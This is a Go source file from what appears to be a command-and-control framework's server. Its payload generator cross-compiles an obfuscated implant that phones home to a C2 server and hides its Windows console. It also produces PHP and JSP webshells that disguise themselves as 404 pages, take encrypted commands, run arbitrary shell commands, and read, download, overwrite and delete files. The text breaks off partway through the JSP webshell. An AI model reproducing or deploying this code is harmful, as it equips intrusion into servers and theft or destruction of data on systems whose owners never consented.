package main

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

// ============ Payload 生成（与 payload_gen.py + app.py gen_* 对齐）============
// 关键变化: EXE 生成从 "C agent + mingw 编译" 改为 "Go agent 交叉编译"
// Go agent 已完整实现 23 种任务处理器，位于 client-go/ 目录

// GeneratePayloadRequest Payload 生成请求参数
// 兼容前端字段名: type/format, os/platform, obfuscation/obf_level
type GeneratePayloadRequest struct {
	Name          string `json:"name"`
	Platform      string `json:"platform"`   // windows / linux / webshell
	OS            string `json:"os"`         // 前端用 os 字段，与 platform 同义
	Arch          string `json:"arch"`       // amd64 / x86 / arm / mips
	Format        string `json:"format"`     // exe / php / jsp / aspx / bat / ps1 / sh / python / shellcode
	Type          string `json:"type"`       // 前端用 type 字段，与 format 同义
	Protocol      string `json:"protocol"`   // 通信协议: http / https / websocket / tcp
	Encryption    string `json:"encryption"` // none / aes-128-cbc / aes-256-cbc / xor / rc4 / chacha20
	ObfLevel      string `json:"obf_level"`  // low / medium / high / extreme
	Obfuscation   string `json:"obfuscation"` // 前端用 obfuscation 字段，与 obf_level 同义
	EncPassword   string `json:"enc_password"`
	ShellcodeData string `json:"shellcode_data"` // shellcode hex 字符串
	IconPath      string `json:"icon_path"`
}

// getFormat 返回格式（兼容 type/format 两个字段）
func (r *GeneratePayloadRequest) getFormat() string {
	if r.Format != "" {
		return r.Format
	}
	return r.Type
}

// getPlatform 返回平台（兼容 os/platform 两个字段）
func (r *GeneratePayloadRequest) getPlatform() string {
	if r.Platform != "" {
		return r.Platform
	}
	return r.OS
}

// getObfLevel 返回混淆级别（兼容 obfuscation/obf_level 两个字段）
func (r *GeneratePayloadRequest) getObfLevel() string {
	if r.ObfLevel != "" {
		return r.ObfLevel
	}
	return r.Obfuscation
}

// generatePayloadResult Payload 生成结果
type generatePayloadResult struct {
	Code     string // 生成的代码/文件内容
	Ext      string // 文件扩展名
	FilePath string // 保存的文件路径（EXE 场景）
}

// handleGeneratePayload Payload 生成 API（与 app.py /api/payload/generate 对齐）
func handleGeneratePayload(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	var req GeneratePayloadRequest
	if err := decodeJSON(r, &req); err != nil {
		jsonError(w, "Invalid request: "+err.Error(), http.StatusBadRequest)
		return
	}

	// 从配置管理读取 host/port
	// 注意: port 使用 agent 专用端口 client_listen_port（默认 8443），
	// 与 web 管理端口（listen_port，默认 5000）分离，
	// 避免 agent 回连流量与 web 管理流量混在同一端口
	host := getCallbackHost()
	// 通信协议: 优先用前端选择的协议，为空时回退到配置管理的 agent_protocol
	// 支持的协议: http / https / websocket / tcp
	protocol := req.Protocol
	if protocol == "" {
		protocol = getAgentProtocol()
	}
	// https 需要 SSL 证书，如果配置了 https 但没有证书，回退到 http
	if protocol == "https" {
		if getSSLCert() == "" || getSSLKey() == "" {
			protocol = "http"
		}
	}
	// 根据协议选择端口: TCP 用 agent_tcp_port（默认 28443），其他用 client_listen_port（默认 8443）
	// 这样 c2Server 字符串里的端口与实际连接端口一致，避免显示误导
	port := getClientListenPort()
	if protocol == "tcp" {
		port = getAgentTCPPort()
	}

	// 加密参数: 请求指定 > 配置管理
	encAlgo := req.Encryption
	if encAlgo == "" {
		encAlgo = getSettingDefault("traffic_encryption", "none")
	}
	if encAlgo == "aes" {
		encAlgo = "aes-128-cbc"
	}
	encPassword := req.EncPassword
	if encPassword == "" {
		encPassword = getSettingDefault("traffic_enc_password", "C2DemoKey2024!!!")
	}
	if req.getObfLevel() == "" {
		req.ObfLevel = "high"
	}

	// 生成 Payload
	result, err := generatePayload(req, host, port, protocol, encAlgo, encPassword)
	if err != nil {
		jsonError(w, "生成失败: "+err.Error(), http.StatusInternalServerError)
		return
	}

	// 保存到 payloads 目录并写入数据库
	c2Server := fmt.Sprintf("%s://%s:%s", protocol, host, port)
	safeName := sanitizeFilename(req.Name)
	if safeName == "" {
		safeName = fmt.Sprintf("payload_%d", time.Now().Unix())
	}

	fileName := safeName + "." + result.Ext
	filePath := filepath.Join(payloadDir(), fileName)

	if result.FilePath != "" {
		// EXE 场景: 已经编译保存到文件，复制到 payloads 目录
		if result.FilePath != filePath {
			copyFile(result.FilePath, filePath)
		}
	} else {
		// 脚本场景: 写入文件
		os.WriteFile(filePath, []byte(result.Code), 0644)
	}

	// 生成投递 token
	deliveryToken := md5Hash(fmt.Sprintf("%s%d", safeName, time.Now().UnixNano()))

	// 写入数据库（使用兼容后的字段）
	fmtVal := req.getFormat()
	plat := req.getPlatform()
	tid, _ := dbExec(`INSERT INTO payloads
		(name, type, os, arch, format, encryption, listen_host, listen_port, protocol, file_path, delivery_token)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
		safeName, fmtVal, plat, req.Arch, fmtVal, encAlgo,
		host, port, protocol, filePath, deliveryToken)

	addLog("payload", fmt.Sprintf("生成 Payload: %s (%s/%s)", safeName, plat, fmtVal), "", user.UserID, getRequestIP(r))
	broadcastTaskUpdate()

	// 构造投递 URL
	deliveryURL := fmt.Sprintf("%s/deliver/%s", c2Server, deliveryToken)

	jsonOK(w, map[string]interface{}{
		"success":       true,
		"payload_id":    tid,
		"filename":      fileName,
		"delivery_url":  deliveryURL,
		"delivery_token": deliveryToken,
		"size":          fileSize(filePath),
	})
}

// generatePayload 根据请求生成 Payload
func generatePayload(req GeneratePayloadRequest, host, port, protocol, encAlgo, encPassword string) (*generatePayloadResult, error) {
	format := req.getFormat()
	platform := req.getPlatform()
	obfLevel := req.getObfLevel()
	switch format {
	case "exe", "exe_raw":
		return generateGoAgent(platform, req.Arch, host, port, protocol, encAlgo, encPassword, obfLevel)
	case "php":
		return &generatePayloadResult{Code: genPHPWebshell(host, port, protocol, encAlgo, encPassword, obfLevel), Ext: "php"}, nil
	case "jsp":
		return &generatePayloadResult{Code: genJSPWebshell(host, port, protocol, encAlgo, encPassword, obfLevel), Ext: "jsp"}, nil
	case "aspx":
		return &generatePayloadResult{Code: genASPXWebshell(host, port, protocol, encAlgo, encPassword, obfLevel), Ext: "aspx"}, nil
	case "bat":
		return &generatePayloadResult{Code: genBAT(host, port, protocol, encAlgo, encPassword), Ext: "bat"}, nil
	case "ps1":
		return &generatePayloadResult{Code: genPS1(host, port, protocol, encAlgo, encPassword), Ext: "ps1"}, nil
	case "sh":
		return &generatePayloadResult{Code: genShell(host, port, protocol, encAlgo, encPassword), Ext: "sh"}, nil
	case "python":
		return &generatePayloadResult{Code: genPythonAgent(host, port, protocol, encAlgo, encPassword, obfLevel), Ext: "py"}, nil
	case "shellcode":
		// shellcode 生成（独立场景，通过 /api/payload/shellcode/generate 端点处理）
		return nil, fmt.Errorf("shellcode 请使用 /api/payload/shellcode/generate 端点")
	default:
		return nil, fmt.Errorf("不支持的格式: %s", format)
	}
}

// ============ Go Agent 编译生成（替代 C agent + mingw）============
// 从 client-go/ 目录交叉编译 Go agent 为目标平台二进制
// 每次生成会在临时目录注入随机混淆代码，确保编译产物 MD5 每次不同

func generateGoAgent(platform, arch, host, port, protocol, encAlgo, encPassword, obfLevel string) (*generatePayloadResult, error) {
	// 准备混淆后的 agent 源码目录（复制 client-go + 注入随机垃圾代码）
	agentDir, err := prepareObfuscatedAgentDir(obfLevel)
	if err != nil {
		return nil, fmt.Errorf("准备混淆源码失败: %w", err)
	}
	defer os.RemoveAll(agentDir) // 编译完成后清理临时目录

	// 确定 GOOS / GOARCH
	goos := platform
	if goos == "" {
		goos = runtime.GOOS
	}
	goarch := arch
	if goarch == "" {
		goarch = "amd64"
	}
	// 架构映射
	switch goarch {
	case "x86":
		goarch = "386"
	case "amd64":
		goarch = "amd64"
	case "arm":
		goarch = "arm"
	case "arm64":
		goarch = "arm64"
	}

	// 输出文件名
	ext := ""
	if goos == "windows" {
		ext = ".exe"
	}
	outputName := fmt.Sprintf("c2_agent_%s_%s%s", goos, goarch, ext)
	outputPath := filepath.Join(payloadDir(), outputName)

	// 构造编译命令
	// 通过 -ldflags 注入配置（与环境变量 C2_SERVER/C2_ENC_ALGO/C2_ENC_PASSWORD 对齐）
	// Windows 平台添加 -H windowsgui 隐藏控制台黑框（PE subsystem 设为 GUI，不弹窗）
	// -buildid= 通过 ldflags 设置空 build ID（防止 Go 写入基于内容哈希的固定 ID）
	// -trimpath 去除文件路径信息（避免泄露编译机器路径）
	c2Server := fmt.Sprintf("%s://%s:%s", protocol, host, port)
	// 通过 ldflags 注入通信协议和 TCP 端口（与 client-go config.go 包级变量对齐）
	agentTcpPort := getSettingDefault("agent_tcp_port", "28443")
	ldflags := fmt.Sprintf("-buildid= -X 'main.C2Server=%s' -X 'main.EncAlgo=%s' -X 'main.EncPassword=%s' -X 'main.Protocol=%s' -X 'main.AgentTCPPort=%s'",
		c2Server, encAlgo, encPassword, protocol, agentTcpPort)
	if goos == "windows" {
		ldflags = "-H windowsgui " + ldflags
	}

	// 设置交叉编译环境变量
	// -trimpath: 去除路径信息
	cmd := exec.Command("go", "build", "-trimpath", "-ldflags", ldflags, "-o", outputPath, ".")
	cmd.Dir = agentDir
	cmd.Env = append(os.Environ(),
		"CGO_ENABLED=0",
		"GOOS="+goos,
		"GOARCH="+goarch,
	)

	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("Go 编译失败: %w\n%s", err, string(output))
	}

	if !fileExists(outputPath) {
		return nil, fmt.Errorf("编译产物不存在: %s", outputPath)
	}

	return &generatePayloadResult{
		Ext:      strings.TrimPrefix(ext, "."),
		FilePath: outputPath,
		Code:     "", // 二进制文件不返回代码
	}, nil
}

// ============ PHP WebShell 生成（与 payload_gen.py gen_php 对齐，冰蝎被动模式）============

func genPHPWebshell(host, port, protocol, encAlgo, encPassword, obfLevel string) string {
	if encAlgo == "" {
		encAlgo = "none"
	}
	if encPassword == "" {
		encPassword = "C2DemoKey2024!!!"
	}

	phpCode := fmt.Sprintf(`<?php
@error_reporting(0);
@set_time_limit(60);

// 通信加密层（与 C2 crypto_utils.py 算法对齐）
$ENC_PASSWORD = '%s';
$ENC_ALGO = '%s';

function _derive_key($bit_len) {
    return substr(hash('sha256', $GLOBALS['ENC_PASSWORD'], true), 0, intval($bit_len / 8));
}

function _enc_decrypt($data, $algo) {
    if ($algo === 'none' || $algo === '') return base64_decode($data);
    if ($algo === 'aes-128-cbc' || $algo === 'aes-256-cbc') {
        $raw = base64_decode($data);
        $keylen = $algo === 'aes-128-cbc' ? 128 : 256;
        $key = _derive_key($keylen);
        $iv = substr($raw, 0, 16);
        $ct = substr($raw, 16);
        $cipher = $algo === 'aes-128-cbc' ? 'AES-128-CBC' : 'AES-256-CBC';
        return openssl_decrypt($ct, $cipher, $key, OPENSSL_RAW_DATA, $iv);
    }
    if ($algo === 'xor') {
        $raw = base64_decode($data);
        $key = $GLOBALS['ENC_PASSWORD'];
        $out = '';
        for ($i = 0; $i < strlen($raw); $i++) {
            $out .= chr(ord($raw[$i]) ^ ord($key[$i %% strlen($key)]));
        }
        return $out;
    }
    if ($algo === 'rc4') {
        $raw = base64_decode($data);
        $key = _derive_key(256);
        $s = range(0, 255); $j = 0;
        for ($i = 0; $i < 256; $i++) {
            $j = ($j + $s[$i] + ord($key[$i %% strlen($key)])) %% 256;
            $t = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $t;
        }
        $i = $j = 0; $out = '';
        for ($k = 0; $k < strlen($raw); $k++) {
            $i = ($i + 1) %% 256;
            $j = ($j + $s[$i]) %% 256;
            $t = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $t;
            $out .= chr(ord($raw[$k]) ^ $s[($s[$i] + $s[$j]) %% 256]);
        }
        return $out;
    }
    if ($algo === 'chacha20' && function_exists('sodium_crypto_stream_xor')) {
        $raw = base64_decode($data);
        $key = _derive_key(256);
        $nonce = substr($raw, 0, 12);
        $ct = substr($raw, 12);
        return sodium_crypto_stream_xor($ct, $nonce, $key);
    }
    return base64_decode($data);
}

function _enc_encrypt($data, $algo) {
    if ($algo === 'none' || $algo === '') return base64_encode($data);
    if ($algo === 'aes-128-cbc' || $algo === 'aes-256-cbc') {
        $keylen = $algo === 'aes-128-cbc' ? 128 : 256;
        $key = _derive_key($keylen);
        $iv = random_bytes(16);
        $cipher = $algo === 'aes-128-cbc' ? 'AES-128-CBC' : 'AES-256-CBC';
        $ct = openssl_encrypt($data, $cipher, $key, OPENSSL_RAW_DATA, $iv);
        return base64_encode($iv . $ct);
    }
    if ($algo === 'xor') {
        $key = $GLOBALS['ENC_PASSWORD'];
        $out = '';
        for ($i = 0; $i < strlen($data); $i++) {
            $out .= chr(ord($data[$i]) ^ ord($key[$i %% strlen($key)]));
        }
        return base64_encode($out);
    }
    if ($algo === 'rc4') {
        $key = _derive_key(256);
        $s = range(0, 255); $j = 0;
        for ($i = 0; $i < 256; $i++) {
            $j = ($j + $s[$i] + ord($key[$i %% strlen($key)])) %% 256;
            $t = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $t;
        }
        $i = $j = 0; $out = '';
        for ($k = 0; $k < strlen($data); $k++) {
            $i = ($i + 1) %% 256;
            $j = ($j + $s[$i]) %% 256;
            $t = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $t;
            $out .= chr(ord($data[$k]) ^ $s[($s[$i] + $s[$j]) %% 256]);
        }
        return base64_encode($out);
    }
    if ($algo === 'chacha20' && function_exists('sodium_crypto_stream_xor')) {
        $key = _derive_key(256);
        $nonce = random_bytes(12);
        $ct = sodium_crypto_stream_xor($data, $nonce, $key);
        return base64_encode($nonce . $ct);
    }
    return base64_encode($data);
}

function sysinfo() {
    return array(
        'hostname' => php_uname('n'),
        'os' => php_uname('s'),
        'os_version' => php_uname('r'),
        'arch' => php_uname('m'),
        'username' => @get_current_user(),
        'ip' => isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'unknown'
    );
}

$algo = $ENC_ALGO;
$raw_input = file_get_contents('php://input');
// 纯密文协议: body 是 base64(IV+密文)，算法用硬编码 ENC_ALGO
if ($algo && $algo !== 'none') {
    $decrypted = _enc_decrypt($raw_input, $algo);
    $req = json_decode($decrypted, true);
} else {
    // none 模式: base64(JSON) 或直接 JSON
    $req = json_decode($raw_input, true);
    if (!$req) {
        $req = json_decode(base64_decode($raw_input), true);
    }
}

// 无请求时返回伪装 404（冰蝎被动模式，不主动回连）
if (!$req || !isset($req['action'])) {
    header("Content-Type: text/html; charset=utf-8");
    echo "<html><head><title>System Service</title></head><body><h1>404 Not Found</h1><p>The requested URL was not found on this server.</p></body></html>";
    exit;
}

$action = $req['action'];
$param = isset($req['param']) ? $req['param'] : array();
$result = '';
$status = 'completed';

switch ($action) {
    case 'cmd':
        $cmd = isset($param['command']) ? $param['command'] : '';
        $shell = isset($param['shell']) ? $param['shell'] : '';
        if (php_uname('s') === 'Windows NT' && $shell === 'powershell') {
            $cmd = 'powershell -Command "' . $cmd . '"';
        }
        $result = @shell_exec($cmd . ' 2>&1');
        if (!$result) $result = '(no output)';
        break;
    case 'sysinfo':
        $result = json_encode(sysinfo());
        break;
    case 'file_list':
        $path = isset($param['path']) ? $param['path'] : '.';
        $files = array();
        if (is_dir($path)) {
            foreach (scandir($path) as $f) {
                if ($f === '.' || $f === '..') continue;
                $fp = $path . DIRECTORY_SEPARATOR . $f;
                $files[] = array('name' => $f, 'is_dir' => is_dir($fp), 'size' => is_file($fp) ? filesize($fp) : 0, 'mtime' => date('Y-m-d H:i', @filemtime($fp)));
            }
        }
        $result = json_encode(array('path' => realpath($path) ?: $path, 'items' => $files));
        break;
    case 'file_view':
        $fp = isset($param['path']) ? $param['path'] : '';
        $content = @file_get_contents($fp);
        $result = json_encode(array('path' => $fp, 'content' => $content, 'size' => @filesize($fp), 'encoding' => 'utf-8'));
        break;
    case 'file_delete':
        $p = isset($param['path']) ? $param['path'] : '';
        $ok = is_dir($p) ? @rmdir($p) : @unlink($p);
        $result = $ok ? 'OK' : '[ERROR] delete failed';
        break;
    case 'file_mkdir':
        $p = isset($param['path']) ? $param['path'] : '';
        $result = @mkdir($p, 0755, true) ? 'OK' : '[ERROR] mkdir failed';
        break;
    case 'file_rename':
        $old = isset($param['old_path']) ? $param['old_path'] : '';
        $new = isset($param['new_path']) ? $param['new_path'] : '';
        $result = @rename($old, $new) ? 'OK' : '[ERROR] rename failed';
        break;
    case 'file_save':
        $fp = isset($param['path']) ? $param['path'] : '';
        $content = isset($param['content']) ? $param['content'] : '';
        $result = @file_put_contents($fp, $content) !== false ? json_encode(array('path' => $fp, 'size' => strlen($content))) : '[ERROR] save failed';
        break;
    case 'file_download':
        $fp = isset($param['path']) ? $param['path'] : '';
        $data = @file_get_contents($fp);
        if ($data !== false) {
            $result = json_encode(array('filename' => basename($fp), 'data' => base64_encode($data)));
        } else {
            $result = '[ERROR] file not found';
        }
        break;
    default:
        $result = '[ERROR] Unsupported action: ' . $action;
        $status = 'failed';
}

$response = json_encode(array('status' => $status, 'result' => $result));
$encrypted = _enc_encrypt($response, $algo);
header("Content-Type: application/json; charset=utf-8");
echo $encrypted;
?>`, encPassword, encAlgo)

	return obfuscate(phpCode, "php", obfLevel)
}

// ============ JSP WebShell 生成（简化版，冰蝎被动模式）============

func genJSPWebshell(host, port, protocol, encAlgo, encPassword, obfLevel string) string {
	if encAlgo == "" {
		encAlgo = "none"
	}
	if encPassword == "" {
		encPassword = "C2DemoKey2024!!!"
	}

	jspCode := fmt.Sprintf(`<%%@ page import="java.io.*,java.net.*,java.util.*,java.security.MessageDigest,javax.crypto.*,javax.crypto.spec.*" %%>
<%%!
    String ENC_PASSWORD = "%s";
    String ENC_ALGO = "%s";

    byte[] deriveKey(int bitLen) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] hash = md.digest(ENC_PASSWORD.getBytes("UTF-8"));
            return Arrays.copyOf(hash, bitLen / 8);
        } catch (Exception e) { return new byte[bitLen / 8]; }
    }

    String b64enc(byte[] data) { return java.util.Base64.getEncoder().encodeToString(data); }
    byte[] b64dec(String s) { return java.util.Base64.getDecoder().decode(s); }

    byte[] rc4(byte[] data, byte[] key) {
        int[] S = new int[256];
        for (int i = 0; i < 256; i++) S[i] = i;
        int j = 0;
        for (int i = 0; i < 256; i++) {
            j = (j + S[i] + (key[i %% key.length] & 0xff)) & 0xff;
            int t = S[i]; S[i] = S[j]; S[j] = t;
        }
        byte[] out = new byte[data.length];
        int x = 0, y = 0;
        for (int k = 0; k < data.length; k++) {
            x = (x + 1) & 0xff;
            y = (y + S[x]) & 0xff;
            int t = S[x]; S[x] = S[y]; S[y] = t;
            out[k] = (byte) (data[k] ^ S[(S[x] + S[y]) & 0xff]);
        }
        return out;
    }

    String decrypt(String data, String algo) {
        try {
            if (algo == null || algo.equals("none") || algo.isEmpty()) return new String(b64dec(data), "UTF-8");
            if (algo.equals("aes-128-cbc") || algo.equals("aes-256-cbc")) {
                byte[] raw = b64dec(data);
                byte[] iv = Arrays.copyOfRange(raw, 0, 16);
                byte[] ct = Arrays.copyOfRange(raw, 16, raw.length);
                int bits = algo.equals("aes-128-cbc") ? 128 : 256;
                SecretKeySpec key = new SecretKeySpec(deriveKey(bits), "AES");
                Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
                cipher.init(Cipher.DECRYPT_MODE, key, new IvParameterSpec(iv));
                return new String(cipher.doFinal(ct), "UTF-8");
            }
            if (algo.equals("xor")) {
                byte[] raw = b64dec(data);
                byte[] key = ENC_PASSWORD.getBytes("UTF-8");
                for (int i = 0; i < raw.length; i++) raw[i] ^= key[i %% key.length];
                return new String(raw, "UTF-8");
            }
            if (algo.equals("rc4")) {
                return new String(rc4(b64dec(data), ENC_PASSWORD.getBytes("UTF-8")), "UTF-8");
            }
            if (algo.equals("chacha20")) {
                byte[] raw = b64dec(data);
                byte[] nonce = Arrays.copyOfRange(raw, 0, 12);
                byte[] ct = Arrays.copyOfRange(raw, 12, raw.length);
                SecretKeySpec key = new SecretKeySpec(deriveKey(256), "ChaCha20");
                Cipher cipher = Cipher.getInstance("ChaCha20");
                cipher.init(Cipher.DECRYPT_MODE, key, new IvParameterSpec(nonce));
                return new String(cipher.doFinal(ct), "UTF-8");
            }
            return new String(b64dec(data), "UTF-8");
        } catch (Exception e) { return null; }
    }

    String encrypt(String data, String algo) {
        try {
            if (algo == null || algo.equals("none") || algo.isEmpty()) return b64enc(data.getBytes("UTF-8"));
            if (algo.equals("aes-128-cbc") || algo.equals("aes-256-cbc")) {
                int bits = algo.equals("aes-128-cbc") ? 128 : 256;
                byte[] key = deriveKey(bits);
                byte[] iv = new byte[16]; new java.security.SecureRandom().nextBytes(iv);
                Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
                cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(iv));
                byte[] ct = cipher.doFinal(data.getBytes("UTF-8"));
                byte[] combined = new byte[iv.length + ct.length];
                System.arraycopy(iv, 0, combined, 0, iv.length);
                System.arraycopy(ct, 0, combined, iv.length, ct.length);
                return b64enc(combined);
            }
            if (algo.equals("xor")) {
                byte[] raw = data.getBytes("UTF-8");
                byte[] key = ENC_PASSWORD.getBytes("UTF-8");
                for (int i = 0; i < raw.length; i++) raw[i] ^= key[i %% key.length];
                return b64enc(raw);
            }
            if (algo.equals("rc4")) {
                return b64enc(rc4(data.getBytes("UTF-8"), ENC_PASSWORD.getBytes("UTF-8")));
            }
            if (algo.equals("chacha20")) {
                byte[] nonce = new byte[12]; new java.security.SecureRandom().nextBytes(nonce);
                SecretKeySpec key = new SecretKeySpec(deriveKey(256), "ChaCha20");
                Cipher cipher = Cipher.getInstance("ChaCha20");
                cipher.init(Cipher.ENCRYPT_MODE, key, new IvParameterSpec(nonce));
                byte[] ct = cipher.doFinal(data.getBytes("UTF-8"));
                byte[] combined = new byte[nonce.length + ct.length];
                System.arraycopy(nonce, 0, combined, 0, nonce.length);
                System.arraycopy(ct, 0, combined, nonce.length, ct.length);
                return b64enc(combined);
            }
            return b64enc(data.getBytes("UTF-8"));
        } catch (Exception e) { return null; }
    }

    String jsonEscape(String s) {
        if (s == null) return "";
        StringBuilder sb = new StringBuilder();
        String hex = "0123456789abcdef";
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '"': sb.append("\\\""); break;
                case '\\': sb.append("\\\\"); break;
                case '\n': sb.append("\\n"); break;
                case '\r': sb.append("\\r"); break;
                case '\t': sb.append("\\t"); break;
                case '\b': sb.append("\\b"); break;
                case '\f': sb.append("\\f"); break;
                default:
                    if (c < 0x20) {
                        sb.append("\\u");
                        sb.append(hex.charAt((c >> 12) & 0xf));
                        sb.append(hex.charAt((c >> 8) & 0xf));
                        sb.append(hex.charAt((c >> 4) & 0xf));
                        sb.append(hex.charAt(c & 0xf));
                    } else sb.append(c);
            }
        }
        return sb.toString();
    }

    String jsonGet(String json, String key) {
        String pat = "\"" + key + "\"";
        int idx = json.indexOf(pat);
        if (idx < 0) return null;
        idx = json.indexOf(':', idx + pat.length());
        if (idx < 0) return null;
        idx++;
        while (idx < json.length() && Character.isWhitespace(json.charAt(idx))) idx++;
        if (idx >= json.length() || json.charAt(idx) != '"') return null;
        idx++;
        StringBuilder sb = new StringBuilder();
        while (idx < json.length()) {
            char ch = json.charAt(idx);
            if (ch == '\\' && idx + 1 < json.length()) {
                char n = json.charAt(idx + 1);
                switch (n) {
                    case '"': sb.append('"'); break;
                    case '\\': sb.append('\\'); break;
                    case '/': sb.append('/'); break;
                    case 'n': sb.append('\n'); break;
                    case 't': sb.append('\t'); break;
                    case 'r': sb.append('\r'); break;
                    case 'b': sb.append('\b'); break;
                    case 'f': sb.append('\f'); break;
                    case 'u':
                        if (idx + 5 < json.length()) {
                            sb.append((char) Integer.parseInt(json.substring(idx + 2, idx + 6), 16));
                            idx += 4;
                        }
                        break;
                    default: sb.append(n);
                }
                idx += 2;
            } else if (ch == '"') {
                break;
            } else {
                sb.append(ch);
                idx++;
            }
        }
        return sb.toString();
    }

    String jsonObj(String json, String key) {
        String pat = "\"" + key + "\"";
        int idx = json.indexOf(pat);
        if (idx < 0) return "{}";
        idx = json.indexOf(':', idx + pat.length());
        if (idx < 0) return "{}";
        idx++;
        while (idx < json.length() && Character.isWhitespace(json.charAt(idx))) idx++;
        if (idx >= json.length() || json.charAt(idx) != '{') return "{}";
        int depth = 0;
        int start = idx;
        boolean inStr = false;
        while (idx < json.length()) {
            char ch = json.charAt(idx);
            if (inStr) {
                if (ch == '\\') { idx += 2; continue; }
                if (ch == '"') inStr = false;
            } else {
                if (ch == '"') inStr = true;
                else if (ch == '{') depth++;
                else if (ch == '}') {
                    depth--;
                    if (depth == 0) return json.substring(start, idx + 1);
                }
            }
            idx++;
        }
        return "{}";
    }
%%>
<%%
    String algo = ENC_ALGO;
    String rawInput = request.getReader().lines().reduce("", (a, b) -> a + b);
    // 纯密文协议: body 是 base64(IV+密文)，算法用硬编码 ENC_ALGO
    String decrypted;
    if (algo != null && !algo.equals("none") && !algo.isEmpty()) {
        decrypted = decrypt(rawInput, algo);
    } else {
        // none 模式: base64(JSON) 或直接 JSON
        decrypted = rawInput;
        if (jsonGet(decrypted, "action") == null) {
            decrypted = decrypt(rawInput, "none");
        }
    }
    if (decrypted == null) {
        response.setStatus(404);
        out.println("404 Not Found");
        return;
    }
    String action = jsonGet(decrypted, "action");
    if (action == null) {
        response.setStatus(404);
        out.println("404 Not Found");
        return;
    }
    String param = jsonObj(decrypted, "param");
    String result = "";
    String status = "completed";

    try {
        switch (action) {
            case "cmd": {
                String cmd = jsonGet(param, "command");
                if (cmd == null) cmd = "";
                boolean isWin = System.getProperty("os.name").toLowerCase().contains("win");
                ProcessBuilder pb = new ProcessBuilder(isWin ? new String[]{"cmd","/c",cmd} : new String[]{"sh","-c",cmd});
                pb.redirectErrorStream(true);
                Process p = pb.start();
                BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line).append("\n");
                br.close();
                p.waitFor();
                result = sb.toString();
                if (result.isEmpty()) result = "(no output)";
                break;
            }
            case "sysinfo": {
                String hostname, ip;
                try { hostname = InetAddress.getLocalHost().getHostName(); } catch (Exception e) { hostname = "unknown"; }
                try { ip = InetAddress.getLocalHost().getHostAddress(); } catch (Exception e) { ip = "unknown"; }
                StringBuilder sb = new StringBuilder("{");
                sb.append("\"hostname\":\"").append(jsonEscape(hostname)).append("\"");
                sb.append(",\"os\":\"").append(jsonEscape(System.getProperty("os.name"))).append("\"");
                sb.append(",\"os_version\":\"").append(jsonEscape(System.getProperty("os.version"))).append("\"");
                sb.append(",\"arch\":\"").append(jsonEscape(System.getProperty("os.arch"))).append("\"");
                sb.append(",\"username\":\"").append(jsonEscape(System.getProperty("user.name"))).append("\"");
                sb.append(",\"ip\":\"").append(jsonEscape(ip)).append("\"");
                sb.append("}");
                result = sb.toString();
                break;
            }
            case "file_list": {
                String path = jsonGet(param, "path");
                if (path == null) path = ".";
                File dir = new File(path);
                File[] files = dir.listFiles();
                java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm");
                StringBuilder fsb = new StringBuilder("{\"path\":\"");
                fsb.append(jsonEscape(dir.getAbsolutePath())).append("\",\"items\":[");
                boolean first = true;
                if (files != null) {
                    for (File f : files) {
                        if (!first) fsb.append(",");
                        first = false;
                        fsb.append("{\"name\":\"").append(jsonEscape(f.getName())).append("\"");
                        fsb.append(",\"is_dir\":").append(f.isDirectory());
                        fsb.append(",\"size\":").append(f.length());
                        fsb.append(",\"mtime\":\"").append(sdf.format(new java.util.Date(f.lastModified()))).append("\"");
                        fsb.append("}");
                    }
                }
                fsb.append("]}");
                result = fsb.toString();
                break;
            }
            case "file_view": {
                String fp = jsonGet(param, "path");
                if (fp == null) { result = "[ERROR] path required"; status = "failed"; break; }
                File f = new File(fp);
                if (!f.exists()) { result = "[ERROR] file not found"; status = "failed"; break; }
                byte[] buf = java.nio.file.Files.readAllBytes(f.toPath());
                String content = new String(buf, "UTF-8");
                StringBuilder sb = new StringBuilder("{");
                sb.append("\"path\":\"").append(jsonEscape(fp)).append("\"");
                sb.append(",\"content\":\"").append(jsonEscape(content)).append("\"");
                sb.append(",\"size\":").append(buf.length);
                sb.append(",\"encoding\":\"utf-8\"");
                sb.append("}");
                result = sb.toString();
                break;
            }
            case "file_delete": {
                String fp = jsonGet(param, "path");
                if (fp == null) { result = "[ERROR] path required"; status = "failed"; break; }
                boolean ok = new File(fp).delete();
                result = ok ? "OK" : "[ERROR] delete failed";
                if (!ok) status = "failed";
                break;
            }
            case "file_mkdir": {
                String fp = jsonGet(param, "path");
                if (fp == null) { result = "[ERROR] path required"; status = "failed"; break; }
                File f = new File(fp);
                boolean ok = f.mkdirs() || f.exists();
                result = ok ? "OK" : "[ERROR] mkdir failed";
                if (!ok) status = "failed";
                break;
            }
            case "file_rename": {
                String oldP = jsonGet(param, "old_path");
                String newP = jsonGet(param, "new_path");
                if (oldP == null || newP == null) { result = "[ERROR] old_path and new_path required"; status = "failed"; break; }
                boolean ok = new File(oldP).renameTo(new File(newP));
                result = ok ? "OK" : "[ERROR] rename failed";
                if (!ok) status = "failed";
                break;
            }
            case "file_save": {
                String fp = jsonGet(param, "path");
                String content = jsonGet(param, "content");
                if (fp == null) { result = "[ERROR] path required"; status = "failed"; break; }
                if (content == null) content = "";
                byte[] buf = content.getBytes("UTF-8");
                java.nio.file.Files.write(new File(fp).toPath(), buf);
                StringBuilder sb = new StringBuilder("{");
